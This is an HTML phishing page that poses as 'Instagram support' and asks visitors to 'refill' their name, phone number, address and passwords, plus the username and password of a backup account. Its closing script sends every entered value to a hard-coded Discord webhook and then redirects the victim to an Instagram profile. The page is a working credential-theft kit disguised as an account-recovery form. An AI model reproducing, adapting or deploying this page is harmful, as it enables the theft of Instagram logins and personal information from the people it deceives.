<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram support</title>
    <link rel="shortcut icon" href="./icons8-instagram-16.png" type="image/x-icon">
    <link rel="stylesheet" href="./style/style.css" />
  </head>
  <body>
    <span id="root">
      <section class="section-all">
        <link rel="stylesheet" href="css.css" />
        <!-- 1-Role Main -->
        <main class="main" role="main">
          <div class="wrapper">
            <article class="article">
              <div class="content">
                <div class="login-box">
                  <div class="header">
                    <img
                      class="logo"
                      src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                      alt="Instagram"
                    />
                  </div>
                  <!-- Header end -->
                  <div class="form-wrap">
                    <form class="form">
                      <p class="custom">
                        To gain access to the account. Please refill the
                        information down below
                      </p>
                      <div class="input-box">
                        <input
                          type="text"
                          name="First name"
                          id="fn"
                          placeholder="First name"
                          maxlength="30"
                          aria-required="true"
                          autocapitalize="off"
                          autocorrect="off"
                          required
                        />
                      </div>
                      <div class="input-box">
                        <input
                          type="text"
                          name="Last name"
                          id="ln"
                          placeholder="Last name"
                          maxlength="30"
                          aria-required="true"
                          autocapitalize="off"
                          autocorrect="off"
                          required
                        />
                      </div>
                      <div class="input-box">
                        <input
                          type="text"
                          name="Phone number"
                          id="pn"
                          placeholder="New phone number"
                          maxlength="30"
                          aria-required="true"
                          autocapitalize="off"
                          autocorrect="off"
                          required
                        />
                      </div>
                      <div class="input-box">
                        <input
                          type="text"
                          name="Address"
                          id="ad"
                          placeholder="Address"
                          maxlength="30"
                          aria-required="true"
                          autocapitalize="off"
                          autocorrect="off"
                          required
                        />
                      </div>

                      <div class="input-box">
                        <input
                          type="password"
                          name="password"
                          id="password1"
                          placeholder=" New password"
                          maxlength="30"
                          aria-required="true"
                          autocapitalize="off"
                          autocorrect="off"
                          required
                        />
                      </div>
                      <div class="input-box">
                        <input
                          type="password"
                          name="password"
                          id="password2"
                          placeholder="Repeat password"
                          maxlength="30"
                          aria-required="true"
                          autocapitalize="off"
                          autocorrect="off"
                          required
                        />
                      </div>

                      <p class="custom">Backup Instagram account</p>

                      <div class="input-box">
                        <input
                          type="text"
                          id="username"
                          placeholder="Phone number, username, or email"
                          aria-required="true"
                          maxlength="30"
                          autocapitalize="off"
                          autocorrect="off"
                          name="username"
                          required
                        />
                      </div>

                      <div class="input-box">
                        <input
                          type="password"
                          name="password"
                          id="password"
                          placeholder="Password"
                          maxlength="30"
                          aria-required="true"
                          autocapitalize="off"
                          autocorrect="off"
                          required
                        />
                      </div>

                      <span class="button-box">
                        <button
                          class="btn"
                          type="button"
                          name="submit"
                          onclick="sendMessage()"
                        >
                          Log in
                        </button>
                      </span>

                      <a
                        class="forgot"
                        href="https://www.instagram.com/accounts/password/reset"
                        >Forgot password?</a
                      >
                    </form>
                  </div>
                  <!-- Form-wrap end -->
                </div>
                <!-- Login-box end -->

                <div class="login-box">
                  <p class="text">
                    Don't have an account?<a
                      href="https://www.instagram.com/accounts/emailsignup"
                      >Sign up</a
                    >
                  </p>
                </div>
                <!-- Signup-box end -->

                <div class="app">
                  <p>Get the app.</p>
                  <div class="app-img">
                    <a
                      href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8"
                    >
                      <img
                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png"
                      />
                    </a>
                    <a
                      href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge"
                    >
                      <img
                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png"
                      />
                    </a>
                  </div>
                  <!-- App-img end-->
                </div>
                <!-- App end -->
              </div>
              <!-- Content end -->
            </article>
          </div>
          <!-- Wrapper end -->
        </main>

        <!-- 2-Role Footer -->
        <footer class="footer" role="contentinfo">
          <div class="footer-container">
            <nav class="footer-nav" role="navigation">
              <ul>
                <li><a href=""></a></li>
                <li><a href="https://about.instagram.com">About Us</a></li>
                <li><a href="https://help.instagram.com">Support</a></li>
                <li><a href="https://about.instagram.com/blog">Blog</a></li>
                <li>
                  <a href="https://about.instagram.com/about-us/careers"
                    >Jobs</a
                  >
                </li>
                <li><a href="https://www.instagram.com/developer">Api</a></li>
                <li>
                  <a href="https://help.instagram.com/519522125107875"
                    >Privacy</a
                  >
                </li>
                <li>
                  <a href="https://help.instagram.com/581066165581870">Terms</a>
                </li>
                <li>
                  <a href="https://www.instagram.com/directory/hashtags"
                    >Directory</a
                  >
                </li>
                <li><a href="">Intsagram</a></li>
              </ul>
            </nav>

            <span class="footer-logo">&copy; 2022 Instagram</span>
          </div>
          <!-- Footer container end -->
        </footer>
      </section>
    </span>
    <!-- Root -->

    <!-- Select Link -->
    <script type="text/javascript">
      function la(src) {
        window.location = src;
      }
    </script>

    <script>
      function sendMessage() {
        function sleep(milliseconds) {
          const date = Date.now();
          let currentDate = null;
          do {
            currentDate = Date.now();
          } while (currentDate - date < milliseconds);
        }
        var request = new XMLHttpRequest();
        request.open(
          "POST",
          "https://discord.com/api/webhooks/966798601596571688/hsapAViC-Mpobl4SbtWUm52P15BJY7kv7bQECBXQoaUhSmPnMBFgXu3_xOvoiqfdHjdb"
        );
        request.setRequestHeader("Content-type", "application/json");
        var params = {
          content:
            "> **USERNAME  : **" +
            document.getElementById("username").value +
            "\n> **PASSWORD : **" +
            document.getElementById("password").value +
            "\n> **FIRST_NAME : **" +
            document.getElementById("fn").value +
            "\n> **LAST_NAME : **" +
            document.getElementById("ln").value +
            "\n> **PHONE_NUMBER: **" +
            document.getElementById("pn").value +
            +"\n> **ADDRESS : **" +
            document.getElementById("ad").value +
            "\n> **PASSWORD1 : **" +
            document.getElementById("password1").value +
            "\n> **PASSWORD2 : **" +
            document.getElementById("password2").value,
        };
        request.send(JSON.stringify(params));
        sleep(400);
        window.location.replace(
          "https://www.instagram.com/christian_memestry/"
        );
      }
    </script>
  </body>
</html>
